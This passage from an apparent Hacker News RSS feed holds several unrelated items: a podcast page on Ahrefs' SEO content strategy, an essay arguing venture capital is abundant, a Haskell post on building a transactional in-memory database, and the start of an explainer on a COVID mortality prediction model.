February 22, 2021 | https://www.thefxck.com/interviews/how-to-design-seo-content-that-drives-business-growth | <a href="https://web.archive.org/web/*/https://www.thefxck.com/interviews/how-to-design-seo-content-that-drives-business-growth">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Kicking off season two with a bang, we've got Tim Soulo, CMO of Ahrefs.com.</p><p>‍</p><p>In this episode, we cover:</p><p>• Growing the Ahrefs blog to 1.5 million monthly visitors</p><p>• Why traffic doesn't matter (and why Ahrefs has never used Google Analytics or retargeting pixels)</p><p>• How to design content that drives sign ups (and why you shouldn't waste your time on anything else)</p><p>• How to rank #1 in Google (like Ahrefs does for everything)</p><p>• What type of content Ahrefs writes and why it works so well</p><p>• How to make 'you' focused content that also adds a lot of value</p><p>• What are the limitations to this approach?</p><p>• How do Ahrefs promote their content? How do they build backlinks?</p><p>• What are the six ways content marketing at Ahrefs contributes to revenue growth?</p><p>• Are backlinks really important? If so, why?</p><p>‍</p><h3>Join the How the Fxck community to get instant access to this episode summarised into a PDF playbook. <a href="https://www.thefxck.com/playbooks/tim-soulo-content-marketing">Download here</a>.</h3><p>‍</p><blockquote>"You can be successful with a few simple fundamentals and by getting rid of non-essential stuff. Create a product that's genuinely useful to people. Forget growth hacks, make your product indispensable."</blockquote><h3>Resources mentioned</h3><p><a href="https://ahrefs.com/academy/blogging-for-business">Blogging for business</a> by Ahrefs</p><p><a target="_blank" href="https://www.amazon.com/gp/product/1451686587/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1451686587&amp;linkCode=as2&amp;tag=howthefxckus-20&amp;linkId=d5202612b6821704bdf7b1f534b8a1eb"><img src="https://ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;MarketPlace=US&amp;ASIN=1451686587&amp;ServiceVersion=20070822&amp;ID=AsinImage&amp;WS=1&amp;Format=_SL250_&amp;tag=howthefxckus-20"></a></p><p>‍</p><h3>Watch on YouTube</h3><p><iframe width="560" height="315" src="https://www.youtube.com/embed/TPnbdK7kmjM" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></div></div>]]>
            </description>
            <link>https://www.thefxck.com/interviews/how-to-design-seo-content-that-drives-business-growth</link>
            <guid isPermaLink="false">hacker-news-small-sites-26226832</guid>
            <pubDate>Mon, 22 Feb 2021 17:00:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Abundant Capital]]>
            </title>
            <description>
<![CDATA[
Score 348 | Comments 183 (<a href="https://news.ycombinator.com/item?id=26226723">thread link</a>) | @tomhoward
<br/>
February 22, 2021 | https://blog.aaronkharris.com/abundant-capital | <a href="https://web.archive.org/web/*/https://blog.aaronkharris.com/abundant-capital">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
      <div><p>The venture capital industry was built on the premise that both capital and high quality companies are scarce. For most of the history of the industry, this has been true. I remember sitting at demo day in 2011 and marveling at the fact that the combined capital of all the VCs in the room was less than that controlled by the hedge fund at which I had worked. But the model is wrong. Venture capital is abundant, and that fact should fundamentally change how founders fundraise.<br></p><p>This scarcity model has shaped the structure of startups and VCs - most of what an early stage startup does is designed to convince a VC to invest. Companies treat VCs as a limited resource that is both hard to access and hard to convince. Investors do their best to perpetuate this idea because it allows them to retain control of the pitch and fund dynamic.[1]</p><p>Something interesting happens, though, whenever a company has a signifier of quality - a YC demo day slot, a high quality angel, pedigreed founders, or, even better, strong growth. In these cases, there are investor feeding frenzies, leading to oversubscribed rounds, ever climbing prices, and investors willing to accept ownership targets they - until recently - would have termed unacceptable.</p><p>To be sure, there have always been bidding wars in private equity (of which venture is a subset), but these bidding wars are so frequent now as to be approaching the norm. If capital was actually scarce, this wouldn’t happen, there wouldn’t be enough money to create so many bidding wars.[2]</p><p>Bidding wars aren’t the only evidence of capital abundance. The VCs are changing their businesses because of this abundance, whether or not they admit the reason. The evidence is in the new funds that seem to launch on a daily basis, the multi-billion dollar growth funds that have become increasingly common, and the ownership targets at various rounds that continue to drop.</p><p>At the same time that capital has become more abundant, founders have become smarter about fundraising. There are now a huge number of blogs, classes, essays, guides, and advisers ready to help founders navigate the previously opaque world of fundraising. As a result, founders can approach each funding event with a clear plan of how to run a process. Running an orderly process further increases the chances that a company will see competitive bids.</p><p>As a thought experiment, assume that the abundance model is here to stay. It is also safe to assume that founders will not suddenly forget their newfound knowledge about process. I think this should encourage founders to think about changing fundraising in a few major ways:</p><ol>
<li><p>Founders should approach every fundraising as an auction. This is what each process already is, but the auction is inefficient. There’s lots of language and pseudo-moral arguments about why this is bad, but most of those fall apart if capital is abundant.</p></li>
<li><p>Founders should expand their funnels beyond the traditional VCs. These VCs hold a marketing and branding advantage, much of which is built around the signal to later rounds. If, however, each round is an auction, this benefit evaporates. YC’s demo day proved this funnel expansion works at seed, and there’s no logical reason it should fail at later rounds.</p></li>
<li><p>Once a founder has the information produced by this process, she can decide whether to minimize dilution, maximize price, or optimize around the partner. The answer will change based on the situation, but having access to the choice is important.</p></li>
</ol><p>Founders are hesitant to run this model because they fear that running an auction will create a negative quality signal. Investors encourage this belief because it allows them to keep deal flow proprietary. This is flawed logic. The quality of a company can’t be determined by the investors to whom that company talks when raising money. The quality of a company is determined by whether or not the company is good, and good companies should take advantage of abundant capital markets.[3]</p><p><i>Thanks to Adora Cheung, Janelle Tam, Ilya Sukhar, and Nabeel Hyatt for helping me think this through, even though our conclusions might differ.<br></i></p><p>__</p><p>[1] Perhaps more importantly to the investors’ business model is that this dynamic creates a reason for the existence of VCs. If founders and LPs both internalized how non-scarce capital actually is, they could find one another directly, bypassing VCs.</p><p>[2] It’s important to remember that, even though capital is abundant, it remains unevenly distributed. There are companies that struggle to raise money - some of these may be bad investments, but many are good. This is a problem of access rather than capacity, which is a whole different issue.</p><p>[3] When a company IPOs, it opens ownership up to anyone who can afford a share. Imagine, for a second, an investor arguing that this is a sign of low quality.</p></div>
    
  </div></div>]]>
            </description>
            <link>https://blog.aaronkharris.com/abundant-capital</link>
            <guid isPermaLink="false">hacker-news-small-sites-26226723</guid>
            <pubDate>Mon, 22 Feb 2021 16:54:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I made a reader for HN with Angular]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26226439">thread link</a>) | @izquiratops
<br/>
February 22, 2021 | https://izquiratops.github.io/hacker-reader/ | <a href="https://web.archive.org/web/*/https://izquiratops.github.io/hacker-reader/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://izquiratops.github.io/hacker-reader/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26226439</guid>
            <pubDate>Mon, 22 Feb 2021 16:33:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell Database Implementation – Part 2, Domain Specific Language and Transact]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26225863">thread link</a>) | @todsacerdoti
<br/>
February 22, 2021 | https://dfithian.github.io/2021/02/18/database-implementation-part-2.html | <a href="https://web.archive.org/web/*/https://dfithian.github.io/2021/02/18/database-implementation-part-2.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span>This site uses third party cookies and scripts to improve the functionality of this website.</span><a id="cookie-notice-accept">Approve</a><a href="https://dfithian.github.io/faq/#cookies">More Info</a></p><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>This post is part 2 in a series on database implementation, part 1 is
<a href="https://dfithian.github.io/2021/02/15/database-implementation-part-1.html">here</a>.</p>

<p>In the last post I wrote about creating an underlying tree structure. This post is about creating a DSL and managing
transactions.</p>

<p>If you’d like to skip ahead and read the code, it’s <a href="https://github.com/dfithian/dfdb">here</a>.</p>

<p>I could write an entire post on parsing, but I’ll leave that for another day. For now, we’ll assume that we can parse
all user input into our domain specific language.</p>

<h2 id="the-dsl">The DSL</h2>

<p>In general, I wanted a DSL that could add and remove tables, and read and write data, and create and use indexes.</p>

<div><div><pre><code><span>newtype</span> <span>TableName</span> <span>=</span> <span>TableName</span> <span>{</span> <span>unTableName</span> <span>::</span> <span>Text</span> <span>}</span>

<span>data</span> <span>AtomType</span>
  <span>=</span> <span>AtomTypeInt</span>
  <span>|</span> <span>AtomTypeString</span>
  <span>|</span> <span>AtomTypeBool</span>

<span>data</span> <span>Atom</span>
  <span>=</span> <span>AtomInt</span> <span>Int</span>
  <span>|</span> <span>AtomString</span> <span>Text</span>
  <span>|</span> <span>AtomBool</span> <span>Bool</span>

<span>newtype</span> <span>Row</span> <span>=</span> <span>Row</span> <span>{</span> <span>unRow</span> <span>::</span> <span>[</span><span>Atom</span><span>]</span> <span>}</span>

<span>newtype</span> <span>ColumnName</span> <span>=</span> <span>ColumnName</span> <span>{</span> <span>unColumnName</span> <span>::</span> <span>Text</span> <span>}</span>

<span>newtype</span> <span>IndexName</span> <span>=</span> <span>IndexName</span> <span>{</span> <span>unIndexName</span> <span>::</span> <span>Text</span> <span>}</span>

<span>data</span> <span>WhereClause</span> <span>=</span> <span>WhereClause</span>
  <span>{</span> <span>_whereClauseColumn</span> <span>::</span> <span>ColumnName</span>
  <span>,</span> <span>_whereClauseValue</span>  <span>::</span> <span>Atom</span>
  <span>}</span>

<span>data</span> <span>ColumnDefinition</span> <span>=</span> <span>ColumnDefinition</span>
  <span>{</span> <span>_columnDefinitionName</span> <span>::</span> <span>ColumnName</span>
  <span>,</span> <span>_columnDefinitionType</span> <span>::</span> <span>AtomType</span>
  <span>}</span>

<span>data</span> <span>Statement</span>
  <span>=</span> <span>StatementSelect</span> <span>[</span><span>ColumnName</span><span>]</span> <span>TableName</span> <span>[</span><span>WhereClause</span><span>]</span>
  <span>|</span> <span>StatementInsert</span> <span>Row</span> <span>TableName</span>
  <span>|</span> <span>StatementCreate</span> <span>TableName</span> <span>[</span><span>ColumnDefinition</span><span>]</span>
  <span>|</span> <span>StatementCreateIndex</span> <span>IndexName</span> <span>TableName</span> <span>[</span><span>ColumnName</span><span>]</span>
  <span>|</span> <span>StatementDrop</span> <span>TableName</span>
  <span>|</span> <span>StatementDropIndex</span> <span>IndexName</span>
</code></pre></div></div>

<p>I made a few important decisions for simplicity’s sake:</p>

<ol>
  <li>A <code>SELECT</code> statement filters only using <code>AND</code>, and all comparisons must use equality</li>
  <li><code>INSERT</code> statements must specify every columnar value matching the order of the columns in the internal store</li>
  <li><code>DELETE</code> and <code>UPDATE</code> are not implemented</li>
</ol>

<p>I’m sure there’s a better way to enforce type safety internally than using <code>Atom</code> and <code>AtomType</code> but because I was
moving fast I didn’t spend too much time on it.</p>

<h2 id="the-database-state">The database state</h2>

<div><div><pre><code><span>newtype</span> <span>PrimaryKey</span> <span>=</span> <span>PrimaryKey</span> <span>{</span> <span>unPrimaryKey</span> <span>::</span> <span>Int</span> <span>}</span>

<span>data</span> <span>Table</span> <span>=</span> <span>Table</span>
  <span>{</span> <span>_tableName</span>           <span>::</span> <span>TableName</span>
  <span>,</span> <span>_tableDefinition</span>     <span>::</span> <span>[</span><span>ColumnDefinition</span><span>]</span>
  <span>,</span> <span>_tableRows</span>           <span>::</span> <span>TreeMap</span> <span>PrimaryKey</span> <span>Row</span>
  <span>,</span> <span>_tableNextPrimaryKey</span> <span>::</span> <span>PrimaryKey</span>
  <span>,</span> <span>_tableIndices</span>        <span>::</span> <span>[</span><span>IndexName</span><span>]</span>
  <span>}</span>

<span>data</span> <span>Index</span> <span>=</span> <span>Index</span>
  <span>{</span> <span>_indexName</span>    <span>::</span> <span>IndexName</span>
  <span>,</span> <span>_indexTable</span>   <span>::</span> <span>TableName</span>
  <span>,</span> <span>_indexColumns</span> <span>::</span> <span>[</span><span>ColumnName</span><span>]</span>
  <span>,</span> <span>_indexData</span>    <span>::</span> <span>TreeMap</span> <span>[</span><span>Atom</span><span>]</span> <span>[</span><span>Row</span><span>]</span>
  <span>}</span>

<span>data</span> <span>Database</span> <span>=</span> <span>Database</span>
  <span>{</span> <span>_databaseTables</span>  <span>::</span> <span>Map</span> <span>TableName</span> <span>Table</span>
  <span>,</span> <span>_databaseIndices</span> <span>::</span> <span>Map</span> <span>IndexName</span> <span>Index</span>
  <span>}</span>
</code></pre></div></div>

<p>A <code>Table</code> consists of a name and definition, plus the actual data, and some helpers like the next primary key and the
names of the indexes defined on this table.</p>

<p>An <code>Index</code> refers to a subset of columns on a table, and, for simplicity, duplicates the data in the table (stores
<code>[Row]</code>) instead of using pointers.</p>

<p>A <code>Database</code> consists of tables and indexes.</p>

<h2 id="transactionality">Transactionality</h2>

<p>Having specified the DSL for the database, I was interested in how transactions on the database would work. Enumerating
some of the key features of transactions allowed me to investigate which ones I wanted to implement.</p>

<ol>
  <li>Primitive operations like <code>BEGIN</code>, <code>COMMIT</code>, and <code>ROLLBACK</code></li>
  <li>Concurrency, and relatedly, isolation levels</li>
</ol>

<p>Because I had already made the decision to keep the database in memory in part 1, concurrency and isolation levels
didn’t make much sense to implement. Instead I focused on primitive operations after implementing autocommit.</p>

<h3 id="naive-autocommit-implementation">Naive autocommit implementation</h3>

<p>My first pass on transactionality was to implement autocommit. This was helpful in the case where a table had one or
more indexes that needed to be updated during an insert, and it provided a way to abstract transactions from the
underlying code.</p>

<div><div><pre><code><span>data</span> <span>StatementFailureCode</span>
  <span>=</span> <span>StatementFailureCodeSyntaxError</span> <span>Text</span>
  <span>|</span> <span>StatementFailureCodeInternalError</span> <span>Text</span>

<span>newtype</span> <span>Transaction</span> <span>a</span> <span>=</span> <span>Transaction</span> <span>(</span><span>StateT</span> <span>Database</span> <span>(</span><span>Except</span> <span>StatementFailureCode</span><span>)</span> <span>a</span><span>)</span>
  <span>deriving</span> <span>(</span><span>Functor</span><span>,</span> <span>Applicative</span><span>,</span> <span>Monad</span><span>)</span>

<span>type</span> <span>MonadDatabase</span> <span>m</span> <span>=</span> <span>(</span><span>MonadState</span> <span>Database</span> <span>m</span><span>,</span> <span>MonadError</span> <span>StatementFailureCode</span> <span>m</span><span>)</span>

<span>runTransaction</span> <span>::</span> <span>(</span><span>MonadState</span> <span>Database</span> <span>m</span><span>)</span> <span>=&gt;</span> <span>Transaction</span> <span>a</span> <span>-&gt;</span> <span>m</span> <span>(</span><span>Either</span> <span>StatementFailureCode</span> <span>a</span><span>)</span>
<span>runTransaction</span> <span>(</span><span>Transaction</span> <span>mx</span><span>)</span> <span>=</span> <span>do</span>
  <span>pre</span> <span>&lt;-</span> <span>get</span>
  <span>let</span> <span>result</span> <span>=</span> <span>runExcept</span> <span>$</span> <span>runStateT</span> <span>mx</span> <span>pre</span>
  <span>traverse</span> <span>(</span><span>\</span><span>(</span><span>out</span><span>,</span> <span>post</span><span>)</span> <span>-&gt;</span> <span>put</span> <span>post</span> <span>&gt;&gt;</span> <span>pure</span> <span>out</span><span>)</span> <span>result</span>
</code></pre></div></div>

<p>As an example, execute any sequence of statements using this underlying monad:</p>

<div><div><pre><code><span>newtype</span> <span>Output</span> <span>=</span> <span>Output</span> <span>{</span> <span>unOutput</span> <span>::</span> <span>Text</span> <span>}</span>

<span>execute</span> <span>::</span> <span>MonadDatabase</span> <span>m</span> <span>=&gt;</span> <span>Statement</span> <span>-&gt;</span> <span>m</span> <span>Output</span>
<span>execute</span> <span>=</span> <span>\</span><span>case</span>
  <span>StatementSelect</span> <span>cols</span> <span>tableName</span> <span>wheres</span> <span>-&gt;</span> <span>...</span>
  <span>StatementInsert</span> <span>row</span> <span>tableName</span> <span>-&gt;</span> <span>...</span>
  <span>StatementCreate</span> <span>tableName</span> <span>cols</span> <span>-&gt;</span> <span>...</span>
  <span>StatementCreateIndex</span> <span>indexName</span> <span>tableName</span> <span>cols</span> <span>-&gt;</span> <span>...</span>
  <span>StatementDrop</span> <span>tableName</span> <span>-&gt;</span> <span>...</span>
  <span>StatementDropIndex</span> <span>indexName</span> <span>-&gt;</span> <span>...</span>
</code></pre></div></div>

<p>And run it:</p>

<div><div><pre><code>  <span>runTransaction</span> <span>(</span><span>Transaction</span> <span>(</span><span>execute</span> <span>statement</span><span>))</span> <span>&gt;&gt;=</span> <span>\</span><span>case</span>
    <span>Right</span> <span>output</span> <span>-&gt;</span> <span>putStrLn</span> <span>$</span> <span>unOutput</span> <span>output</span>
    <span>Left</span> <span>code</span> <span>-&gt;</span> <span>case</span> <span>code</span> <span>of</span>
      <span>StatementFailureCodeSyntaxError</span> <span>err</span> <span>-&gt;</span> <span>putStrLn</span> <span>err</span>
      <span>StatementFailureCodeInternalError</span> <span>err</span> <span>-&gt;</span> <span>putStrLn</span> <span>err</span>
</code></pre></div></div>

<p>While autocommit is simple and prevents database corruption, it doesn’t provide a basic feature set, namely the
primitives <code>BEGIN</code>, <code>ROLLBACK</code>, or <code>COMMIT</code>.</p>

<h3 id="less-naive-implementation">Less naive implementation</h3>

<h4 id="transaction-lifecycle">Transaction lifecycle</h4>

<p>In order to implement these underlying primitives, I added constructors to the <code>Statement</code> DSL, created a state machine
for a transaction, and further abstracted the database away from the interpreter.</p>

<div><div><pre><code><span>-- Same as before, plus three operations</span>
<span>data</span> <span>Statement</span>
  <span>...</span>
  <span>|</span> <span>StatementBegin</span>
  <span>|</span> <span>StatementCommit</span>
  <span>|</span> <span>StatementRollback</span>

<span>data</span> <span>TransactionStatus</span>
  <span>=</span> <span>TransactionStatusBegin</span>
  <span>|</span> <span>TransactionStatusAborted</span>
  <span>|</span> <span>TransactionStatusCommit</span>
  <span>|</span> <span>TransactionStatusRollback</span>

<span>data</span> <span>TransactionalDatabase</span> <span>=</span> <span>TransactionalDatabase</span>
  <span>{</span> <span>_transactionalDatabaseLastSavepoint</span> <span>::</span> <span>Database</span>
  <span>,</span> <span>_transactionalDatabaseInner</span>         <span>::</span> <span>Maybe</span> <span>(</span><span>TransactionStatus</span><span>,</span> <span>Database</span><span>)</span>
  <span>}</span>
</code></pre></div></div>

<p>The interpreter still operated on a <code>Database</code>, but <em>which</em> database is determined by whether or not there’s a currently
executing transaction. The transaction runner changed to read the status and perform the appropriate operations. The
interpreter was modified to change the transaction status based on which <code>Statement</code> constructor was passed in.</p>

<div><div><pre><code><span>newtype</span> <span>Transaction</span> <span>a</span> <span>=</span> <span>Transaction</span> <span>(</span><span>StateT</span> <span>(</span><span>Database</span><span>,</span> <span>Maybe</span> <span>TransactionStatus</span><span>)</span> <span>(</span><span>Except</span> <span>StatementFailureCode</span><span>)</span> <span>a</span><span>)</span>
  <span>deriving</span> <span>(</span><span>Functor</span><span>,</span> <span>Applicative</span><span>,</span> <span>Monad</span><span>)</span>

<span>type</span> <span>MonadDatabase</span> <span>m</span> <span>=</span> <span>(</span><span>MonadState</span> <span>(</span><span>Database</span><span>,</span> <span>Maybe</span> <span>TransactionStatus</span><span>)</span> <span>m</span><span>,</span> <span>MonadError</span> <span>StatementFailureCode</span> <span>m</span><span>)</span>
</code></pre></div></div>

<p>The autocommit branch works mostly like it used to, modifying the last savepoint, but will also detect changes to the
transaction status and initialize the transaction.</p>

<div><div><pre><code><span>runAutocommit</span> <span>::</span> <span>(</span><span>MonadState</span> <span>DFDB</span><span>.</span><span>Types</span><span>.</span><span>TransactionalDatabase</span> <span>m</span><span>)</span> <span>=&gt;</span> <span>DFDB</span><span>.</span><span>Types</span><span>.</span><span>Database</span> <span>-&gt;</span> <span>Transaction</span> <span>a</span> <span>-&gt;</span> <span>m</span> <span>(</span><span>Either</span> <span>DFDB</span><span>.</span><span>Types</span><span>.</span><span>StatementFailureCode</span> <span>a</span><span>)</span>
<span>runAutocommit</span> <span>pre</span> <span>(</span><span>Transaction</span> <span>mx</span><span>)</span> <span>=</span> <span>case</span> <span>runExcept</span> <span>$</span> <span>runStateT</span> <span>mx</span> <span>(</span><span>pre</span><span>,</span> <span>Nothing</span><span>)</span> <span>of</span>
  <span>Left</span> <span>err</span> <span>-&gt;</span> <span>pure</span> <span>$</span> <span>Left</span> <span>err</span>
  <span>Right</span> <span>(</span><span>out</span><span>,</span> <span>(</span><span>post</span><span>,</span> <span>postStatusMay</span><span>))</span> <span>-&gt;</span> <span>do</span>
    <span>case</span> <span>postStatusMay</span> <span>of</span>
      <span>Nothing</span> <span>-&gt;</span> <span>assign</span> <span>DFDB</span><span>.</span><span>Types</span><span>.</span><span>transactionalDatabaseLastSavepoint</span> <span>post</span>
      <span>Just</span> <span>postStatus</span> <span>-&gt;</span> <span>do</span>
        <span>put</span> <span>DFDB</span><span>.</span><span>Types</span><span>.</span><span>TransactionalDatabase</span>
          <span>{</span> <span>_transactionalDatabaseLastSavepoint</span> <span>=</span> <span>pre</span>
          <span>,</span> <span>_transactionalDatabaseInner</span> <span>=</span> <span>Just</span> <span>(</span><span>postStatus</span><span>,</span> <span>post</span><span>)</span>
          <span>}</span>
    <span>pure</span> <span>$</span> <span>Right</span> <span>out</span>
</code></pre></div></div>

<p>The transaction runner branch passes in the transient inner database, reverts when rolled back, and overwrites the last
savepoint when committed.</p>

<div><div><pre><code><span>runInner</span> <span>::</span> <span>(</span><span>MonadState</span> <span>TransactionalDatabase</span> <span>m</span><span>)</span> <span>=&gt;</span> <span>TransactionStatus</span> <span>-&gt;</span> <span>Database</span> <span>-&gt;</span> <span>Transaction</span> <span>a</span> <span>-&gt;</span> <span>m</span> <span>(</span><span>Either</span> <span>StatementFailureCode</span> <span>a</span><span>)</span>
<span>runInner</span> <span>preStatus</span> <span>pre</span> <span>(</span><span>Transaction</span> <span>mx</span><span>)</span> <span>=</span> <span>case</span> <span>runExcept</span> <span>$</span> <span>runStateT</span> <span>mx</span> <span>(</span><span>pre</span><span>,</span> <span>Just</span> <span>preStatus</span><span>)</span> <span>of</span>
  <span>Left</span> <span>err</span> <span>-&gt;</span> <span>do</span>
    <span>assign</span> <span>(</span><span>transactionalDatabaseInner</span> <span>.</span> <span>_Just</span> <span>.</span> <span>_1</span><span>)</span> <span>TransactionStatusAborted</span>
    <span>pure</span> <span>$</span> <span>Left</span> <span>err</span>
  <span>Right</span> <span>(</span><span>out</span><span>,</span> <span>(</span><span>post</span><span>,</span> <span>postStatusMay</span><span>))</span> <span>-&gt;</span> <span>do</span>
    <span>case</span> <span>postStatusMay</span> <span>of</span>
      <span>Nothing</span> <span>-&gt;</span> <span>put</span> <span>TransactionalDatabase</span>
        <span>{</span> <span>_transactionalDatabaseLastSavepoint</span> <span>=</span> <span>post</span>
        <span>,</span> <span>_transactionalDatabaseInner</span> <span>=</span> <span>Nothing</span>
        <span>}</span>
      <span>Just</span> <span>TransactionStatusBegin</span> <span>-&gt;</span> <span>assign</span> <span>(</span><span>transactionalDatabaseInner</span> <span>.</span> <span>_Just</span> <span>.</span> <span>_2</span><span>)</span> <span>post</span>
      <span>Just</span> <span>TransactionStatusAborted</span> <span>-&gt;</span> <span>pure</span> <span>()</span>
      <span>Just</span> <span>TransactionStatusCommit</span> <span>-&gt;</span> <span>put</span> <span>TransactionalDatabase</span>
        <span>{</span> <span>_transactionalDatabaseLastSavepoint</span> <span>=</span> <span>post</span>
        <span>,</span> <span>_transactionalDatabaseInner</span> <span>=</span> <span>Nothing</span>
        <span>}</span>
      <span>Just</span> <span>TransactionStatusRollback</span> <span>-&gt;</span> <span>assign</span> <span>transactionalDatabaseInner</span> <span>Nothing</span>
    <span>pure</span> <span>$</span> <span>Right</span> <span>out</span>
</code></pre></div></div>

<p>Finally, <code>runTransaction</code> branches based on whether there’s a currently executing transaction.</p>

<div><div><pre><code><span>runTransaction</span> <span>::</span> <span>(</span><span>MonadState</span> <span>.</span><span>TransactionalDatabase</span> <span>m</span><span>)</span> <span>=&gt;</span> <span>Transaction</span> <span>a</span> <span>-&gt;</span> <span>m</span> <span>(</span><span>Either</span> <span>StatementFailureCode</span> <span>a</span><span>)</span>
<span>runTransaction</span> <span>tx</span> <span>=</span> <span>do</span>
  <span>pre</span> <span>&lt;-</span> <span>get</span>
  <span>case</span> <span>view</span> <span>transactionalDatabaseInner</span> <span>pre</span> <span>of</span>
    <span>Nothing</span> <span>-&gt;</span> <span>runAutocommit</span> <span>(</span><span>view</span> <span>transactionalDatabaseLastSavepoint</span> <span>pre</span><span>)</span> <span>tx</span>
    <span>Just</span> <span>(</span><span>status</span><span>,</span> <span>innerPre</span><span>)</span> <span>-&gt;</span> <span>runInner</span> <span>status</span> <span>innerPre</span> <span>tx</span>
</code></pre></div></div>

<h4 id="transaction-interpretation">Transaction interpretation</h4>

<p>The <code>execute</code> function, also known as the interpreter, added three branches. The branches enforce the state machine
transitions for <code>TransactionStatus</code>, and otherwise allow the transaction runner to handle success and failure.</p>

<div><div><pre><code><span>-- Same as before, plus three branches</span>
<span>execute</span> <span>::</span> <span>MonadDatabase</span> <span>m</span> <span>=&gt;</span> <span>Statement</span> <span>-&gt;</span> <span>m</span> <span>Output</span>
<span>execute</span> <span>=</span> <span>\</span><span>case</span>
  <span>...</span>
  <span>StatementBegin</span> <span>-&gt;</span> <span>do</span>
    <span>whenM</span> <span>(</span><span>uses</span> <span>_2</span> <span>(</span><span>has</span> <span>_Just</span><span>))</span> <span>$</span>
      <span>throwError</span> <span>$</span> <span>StatementFailureCodeInternalError</span> <span>"Already in a transaction"</span>
    <span>assign</span> <span>_2</span> <span>(</span><span>Just</span> <span>TransactionStatusBegin</span><span>)</span>
    <span>pure</span> <span>$</span> <span>Output</span> <span>"BEGIN"</span>

  <span>StatementCommit</span> <span>-&gt;</span> <span>do</span>
    <span>use</span> <span>_2</span> <span>&gt;&gt;=</span> <span>\</span> <span>case</span>
      <span>Nothing</span> <span>-&gt;</span> <span>throwError</span> <span>$</span> <span>StatementFailureCodeInternalError</span> <span>"Not in a transaction"</span>
      <span>Just</span> <span>TransactionStatusBegin</span> <span>-&gt;</span> <span>do</span>
        <span>assign</span> <span>_2</span> <span>(</span><span>Just</span> <span>TransactionStatusCommit</span><span>)</span>
        <span>pure</span> <span>$</span> <span>Output</span> <span>"COMMIT"</span>
      <span>Just</span> <span>_</span> <span>-&gt;</span> <span>throwError</span> <span>$</span> <span>StatementFailureCodeInternalError</span> <span>"Transaction in a funky state; must roll back"</span>

  <span>StatementRollback</span> <span>-&gt;</span> <span>do</span>
    <span>use</span> <span>_2</span> <span>&gt;&gt;=</span> <span>\</span> <span>case</span>
      <span>Nothing</span> <span>-&gt;</span> <span>throwError</span> <span>$</span> <span>StatementFailureCodeInternalError</span> <span>"Not in a transaction"</span>
      <span>Just</span> <span>_</span> <span>-&gt;</span> <span>do</span>
   …</code></pre></div></div></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dfithian.github.io/2021/02/18/database-implementation-part-2.html">https://dfithian.github.io/2021/02/18/database-implementation-part-2.html</a></em></p>]]>
            </description>
            <link>https://dfithian.github.io/2021/02/18/database-implementation-part-2.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26225863</guid>
            <pubDate>Mon, 22 Feb 2021 15:51:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why an interpretable Covid mortality prediction model failed in the real world]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26225784">thread link</a>) | @stuartbman
<br/>
February 22, 2021 | https://explainthispaper.com/ai-covid-prognosis-predictor/ | <a href="https://web.archive.org/web/*/https://explainthispaper.com/ai-covid-prognosis-predictor/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><i>article</i></p>
<div>
<p>An interpretable mortality prediction model for COVID-19 patients</p>
<p>May 14, 2020</p>
<p>Li Yan, Hai-Tao Zhang, Jorge Goncalves, Yang Xiao, Maolin Wang, Yuqi Guo, Chuan Sun, Xiuchuan Tang, Liang Jing, Mingyang Zhang ... Yong Zhang, Ailin Luo, Laurent Mombaerts, Junyang Jin, Zhiguo Cao, Shusheng Li*, Hui Xu* &amp; Ye Yuan</p>
<p><a href="https://www.nature.com/articles/s42256-020-0180-7">Nature Machine Intelligence</a>
</p></div>
</div><div>
<div data-contentpath-field="block">
<h3>Clinical Need</h3><p>COVID-19 is overwhelming healthcare systems worldwide. One reason for this is that COVID-19 causes a spectrum of disease ranging from mild infection to critical illness, and its hard for doctors to anticipate which COVID-19 patients will need more immediate medical attention.</p><p>Having a prediction tool would allow hospitals to quickly triage coronavirus patients into high and low risk levels. In this way, hospital resources can be more adequately allocated to the higher risk coronavirus patients.</p><h3>What did they do?</h3><p>They looked back at blood test results from coronavirus patients in Tangji Hospital in Wuhan, China. They used the latest blood tests to train a machine learning model to predict one of two outcomes: death or survival.</p>
</div>
<div data-contentpath-field="block">
<section>
<div>
<p><span data-contentpath-field="block">
<h3>How was the model made?</h3><p>The group used a popular <sample>classification model</sample> called XGBoost 🤖</p>
</span>
</p>
<div data-contentpath-field="right">

<p>In machine learning, classification is a technique that categorises data into a given number of classes. These classes can have any sort of label e.g. cancer or no cancer. A classification model attempts to reach a conclusion about the input values during training by assigning the input to one of the classes.</p>
<p><img alt="omermohamed.jpg" height="170" src="https://explainthispaper.s3.amazonaws.com/images/image.2e16d0ba.fill-200x200.jpg" width="169">
</p>

</div>
</div>
</section>
</div>
<div data-contentpath-field="block">
<section>
<div>
<p><span data-contentpath-field="block">
<p>This is a type of <sample>decision tree ensemble</sample>.</p>
</span>
</p>
<div data-contentpath-field="right">

